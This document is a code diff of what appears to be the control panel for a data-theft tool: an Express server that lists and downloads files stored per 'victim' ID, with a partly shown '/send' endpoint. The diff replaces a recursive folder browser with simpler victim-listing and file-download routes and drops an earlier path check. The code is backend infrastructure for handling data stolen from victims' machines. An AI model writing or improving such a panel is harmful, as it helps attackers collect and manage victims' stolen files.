@@ -69,14 +69,14 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Root victim view ---
+// --- Browse victim files ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
 
-  let items = [];
+  let files = [];
   try {
-    items = await fs.readdir(victimDir, { withFileTypes: true });
+    files = await fs.readdir(victimDir);
   } catch (err) {
     console.error("Failed to read victim folder:", err);
     return res.status(404).send("Not found");
@@ -84,74 +84,20 @@ app.get("/victim/:id", async (req, res) => {
 
   res.send(
     `<h2>Victim: ${safeId}</h2>
-    <ul>${items.map(item => {
-      const href = `/victim/${safeId}/${item.name}`;
-      return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
-    }).join("")}</ul>`
+    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>`
   );
 });
 
-// --- Handle all /victim/ paths (subfolders and files) ---
-app.use("/victim/", async (req, res, next) => {
-  // req.path has "/victim/" stripped by app.use
-  // e.g., for /victim/ABC/file.txt, req.path = "ABC/file.txt" (no leading /)
-  const pathStr = req.path.startsWith("/") ? req.path.slice(1) : req.path;
-  const parts = pathStr.split("/").filter(Boolean);
-  if (parts.length < 1) return next();
-
-  const safeId = parts[0]; // victim id
-  const subPath = parts.slice(1).join("/") || ""; // rest of path
-
-  const victimDir = path.join(VICTIMS_DIR, safeId);
-  const fullPath = path.join(victimDir, decodeURIComponent(subPath));
-
-  // Security check
-  if (!fullPath.startsWith(victimDir)) {
-    return res.status(403).send("Invalid path");
-  }
-
-  console.log(`[DEBUG] req.path: ${req.path}`);
-  console.log(`[DEBUG] Looking for: ${fullPath}`);
-  console.log(`[DEBUG] VICTIMS_DIR: ${VICTIMS_DIR}`);
-  console.log(`[DEBUG] safeId: ${safeId}`);
-  console.log(`[DEBUG] subPath: ${subPath}`);
-
-  try {
-    const stats = await fs.stat(fullPath);
-    if (stats.isDirectory()) {
-      // Show folder listing
-      const items = await fs.readdir(fullPath, { withFileTypes: true });
-      const parentDir = subPath ? path.dirname(subPath) : "";
-      const backLink = parentDir && parentDir !== "."
-        ? `<a href="/victim/${safeId}/${parentDir.replace(/\\/g, "/")}">⬅️ ..</a><br>`
-        : "";
-
-      res.send(
-        `<h2>Victim: ${safeId}/${subPath.replace(/\\/g, "/")}</h2>
-        ${backLink}
-        <ul>${items.map(item => {
-          const href = `/victim/${safeId}/${path.join(subPath, item.name).replace(/\\/g, "/")}`;
-          return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
-        }).join("")}</ul>`
-      );
-    } else {
-      // Download file
-      res.download(fullPath, err => {
-        if (err) {
-          console.error("Download failed:", err);
-          res.status(404).send("File not found");
-        }
-      });
-    }
-  } catch (err) {
-    console.error("Path error:", err);
-    // List what files actually exist
-    try {
-      const contents = await fs.readdir(victimDir, { recursive: true });
-      console.log(`[DEBUG] Files in victim dir: ${contents.join(", ")}`);
-    } catch (e) {}
-    res.status(404).send("Not found");
-  }
+// --- Download specific file ---
+app.get("/victim/:id/:file", async (req, res) => {
+  const filePath = path.join(
+    VICTIMS_DIR,
+    path.basename(req.params.id),
+    req.params.file
+  );
+  res.download(filePath, err => {
+    if (err) console.error("Download failed:", err);
+  });
 });
 
 // --- Start server ---
